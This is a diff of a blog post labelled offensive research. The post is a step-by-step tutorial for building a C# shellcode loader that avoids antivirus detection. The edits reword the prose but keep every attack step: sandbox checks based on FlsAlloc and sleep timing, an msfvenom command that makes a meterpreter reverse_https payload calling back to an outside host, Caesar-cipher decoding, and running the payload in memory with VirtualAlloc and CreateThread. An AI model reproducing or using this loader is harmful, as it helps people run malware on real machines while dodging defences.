@@ -6,7 +6,7 @@ deck: "A controlled lab study of unusual Windows APIs, execution delays, and lig
 slug: "bypassing-antivirus-detection-with-unusual-windows-apis-delayed-timers-and-encryption"
 file: "04"
 publishedAt: "2025-03-31T06:32:56.862Z"
-updatedAt: "2026-08-02T00:00:00.000Z"
+updatedAt: "2026-08-20T16:00:00.000Z"
 category: "Offensive Research"
 tags:
   - "Windows"
@@ -22,11 +22,11 @@ draft: false
 ---
 This lab builds a C# console application around three evasion primitives: execution delays, the less commonly emulated `FlsAlloc` API, and Caesar cipher encoding. The implementation is developed one component at a time so each behavior can be observed independently.
 
-## Step 1: Setting Up the Environment
+## Step 1: Set up the project
 
-First, we need to set up a new C# console application. Open Visual Studio and create a new project by selecting “Console App (.NET Core)” or “Console App (.NET Framework)”, depending on your preference.
+Create a C# console application in Visual Studio using either "Console App (.NET Core)" or "Console App (.NET Framework)."
 
-Next, add the necessary namespaces and import the required functions from `kernel32.dll` using the `DllImport` attribute. This will allow us to use various Windows API functions in our application.
+Add the namespaces and import the required functions from `kernel32.dll` with `DllImport`.
 
 ```csharp
 using System;
@@ -59,11 +59,11 @@ namespace ConsoleApp1
 }
 ```
 
-## Step 2: Using the FlsAlloc API
+## Step 2: Check FlsAlloc
 
-The `FlsAlloc` function is a Windows API that allocates a fiber local storage (FLS) index. This API is not typically emulated in sandbox environments, making it a useful tool for detecting whether the application is running in such an environment.
+`FlsAlloc` allocates a fiber local storage (FLS) index. Some sandbox environments do not emulate this API correctly, so its return value can provide one signal about the execution environment.
 
-Add the following code to the `Main` method to allocate an FLS index and check if it was successful:
+The first check allocates an FLS index and exits if the call fails:
 
 ```csharp
 static void Main(string[] args)
@@ -80,11 +80,11 @@ static void Main(string[] args)
 }
 ```
 
-## Step 3: Implementing Sleep Timers
+## Step 3: Measure a sleep interval
 
-Sleep timers can be used to delay the execution of the program, which can help to detect sandbox environments that often skip or minimize sleep durations to speed up analysis.
+Some analysis environments shorten sleep calls. Measuring the elapsed time catches that behavior in this sample.
 
-Add the following code to measure the actual sleep duration:
+The program requests a two-second delay and exits if less than 1.5 seconds elapsed:
 
 ```csharp
 DateTime t1 = DateTime.Now;
@@ -96,19 +96,17 @@ if (t2 < 1.5)
 }
 ```
 
-In this snippet, we record the current time, sleep for 2 seconds, and then measure the elapsed time. If the elapsed time is less than 1.5 seconds, we assume the program is running in a sandbox and exit.
+## Step 4: Decode the payload
 
-## Step 4: Implementing Caesar Cipher Encryption
+The sample stores each payload byte with an offset of two, then subtracts that offset at runtime.
 
-The Caesar cipher is a simple encryption technique that shifts each byte by a fixed number of positions. In this case, we will shift each byte by 2 positions to the left.
-
-Generate the shellcode using `msfvenom`
+Generate the shellcode with `msfvenom`:
 
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.1 LPORT=443 -f csharp
 ```
 
-Add the following code to decrypt a byte array using a Caesar cipher:
+Decode the byte array before copying it into memory:
 
 ```csharp
 byte[] buf = new byte[687] { 0xfe, 0xb7, 0xa4, 0x58, 0x01, 0xd7 }; // Example byte array
@@ -119,13 +117,9 @@ for (int i = 0; i < buf.Length; i++)
 }
 ```
 
-This code initializes a byte array and decrypts each byte by shifting it 2 positions to the left.
+## Step 5: Allocate memory and execute the payload
 
-## Step 5: Allocating Memory and Executing Code
-
-To allocate memory and execute code, we will use the `VirtualAlloc` and `CreateThread` functions. This allows us to copy the decrypted byte array into executable memory and create a thread to execute it.
-
-Add the following code to allocate memory, copy the byte array, and create a thread:
+`VirtualAlloc` creates the memory region, `Marshal.Copy` writes the decoded bytes, and `CreateThread` starts execution:
 
 ```csharp
 int size = buf.Length;
@@ -136,11 +130,11 @@ IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero)
 WaitForSingleObject(hThread, 0xFFFFFFFF);
 ```
 
-This snippet allocates a memory region, copies the decrypted byte array into it, creates a thread to execute the code, and waits for the thread to complete.
+`WaitForSingleObject` keeps the process alive until the thread completes.
 
-## Full Code
+## Complete sample
 
-Here is the complete code with all the features integrated:
+The complete sample combines the FLS check, timing check, payload decoding, and in-memory execution:
 
 ```csharp
 using System;
